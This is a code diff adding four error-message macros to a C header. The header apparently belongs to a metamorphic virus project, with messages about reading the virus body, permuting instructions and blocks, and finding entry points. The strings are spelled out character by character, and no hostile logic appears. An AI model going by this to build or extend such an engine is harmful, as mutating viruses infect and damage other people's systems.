@@ -54,6 +54,7 @@
 #  define _ERR_T_EXTENDED_OPCODE           PD_ARRAY(char,_err_text,'\033','[','3','3','m','e','x','t','e','n','d','e','d','_','o','p','c','o','d','e','\n','\033','[','0','m',0)
 #  define _ERR_T_MODRM                     PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','o','d','r','m','\n','\033','[','0','m',0)
 #  define _ERR_T_PERMUTATE_BLOCKS          PD_ARRAY(char,_err_text,'\033','[','3','3','m','p','e','r','m','u','t','a','t','e','_','b','l','o','c','k','s','\n','\033','[','0','m',0)
+#  define _ERR_T_PERMUTATE_INSTRUCTIONS    PD_ARRAY(char,_err_text,'\033','[','3','3','m','p','e','r','m','u','t','a','t','e','_','i','n','s','t','r','u','c','t','i','o','n','s','\n','\033','[','0','m',0)
 #  define _ERR_T_DISASM_BLOCK              PD_ARRAY(char,_err_text,'\033','[','3','3','m','d','i','s','a','s','m','_','b','l','o','c','k','\n','\033','[','0','m',0)
 #  define _ERR_T_DISASM_JUMPS              PD_ARRAY(char,_err_text,'\033','[','3','3','m','d','i','s','a','s','m','_','j','u','m','p','s','\n','\033','[','0','m',0)
 #  define _ERR_T_SHARD_BLOCK               PD_ARRAY(char,_err_text,'\033','[','3','3','m','s','h','a','r','d','_','b','l','o','c','k','\n','\033','[','0','m',0)
@@ -73,6 +74,7 @@
 #  define _ERR_V_CANT_READ_VIRUS           PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','v','i','r','u','s','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_VIRCALL         PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','r','e','a','d',' ','v','i','r','c','a','l','l','\n','\033','[','0','m',0)
 #  define _ERR_V_MAX_JUMP_TOO_SMALL        PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','a','x',' ','j','u','m','p','s',' ','t','o','o',' ','s','m','a','l','l','\n','\033','[','0','m',0)
+#  define _ERR_V_OPERANDS_JUMP_TOO_SMALL   PD_ARRAY(char,_err_text,'\033','[','3','3','m','m','a','x',' ','o','p','e','r','a','n','d','s',' ','t','o','o',' ','s','m','a','l','l','\n','\033','[','0','m',0)
 #  define _ERR_V_INSTRUCTION_LENGTH        PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','n','s','t','r','u','c','t','i','o','n',' ','l','e','n','g','t','h',' ','e','x','c','e','e','d','s',' ','c','o','d','e',' ','l','e','n','g','t','h','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_SPLIT_MORE           PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','\'','t',' ','s','p','l','i','t',' ','m','o','r','e','\n','\033','[','0','m',0)
 #  define _ERR_V_NO_ENTRY_POINT            PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','o','u','l','d','n','\'','t',' ','f','i','n','d',' ','e','n','t','r','y',' ','p','o','i','n','t','\n','\033','[','0','m',0)
@@ -82,6 +84,7 @@
 #  define _ERR_V_BAD_TRAILING_JUMP         PD_ARRAY(char,_err_text,'\033','[','3','3','m','t','r','a','i','l','i','n','g',' ','j','u','m','p',' ','v','a','l','u','e',' ','d','o','e','s','n','\'','t',' ','m','a','t','c','h',' ','d','e','s','t','i','n','a','t','i','o','n','\n','\033','[','0','m',0)
 #  define _ERR_V_NOT_ENOUGH_PADDING        PD_ARRAY(char,_err_text,'\033','[','3','3','m','n','o','t',' ','e','n','o','u','g','h',' ','p','a','d','d','i','n','g','\n','\033','[','0','m',0)
 #  define _ERR_V_CANT_READ_CONSTANTS       PD_ARRAY(char,_err_text,'\033','[','3','3','m','c','a','n','t','\'','t',' ','r','e','a','d',' ','c','o','n','s','t','a','n','t','s','\n','\033','[','0','m',0)
+#  define _ERR_V_NOT_NEIGHBORS             PD_ARRAY(char,_err_text,'\033','[','3','3','m','i','n','s','t',' ','n','o','t',' ','n','e','i','g','h','b','o','u','r','s','\n','\033','[','0','m',0)
 
 /* -------------------------------------------------------------------------- */
 
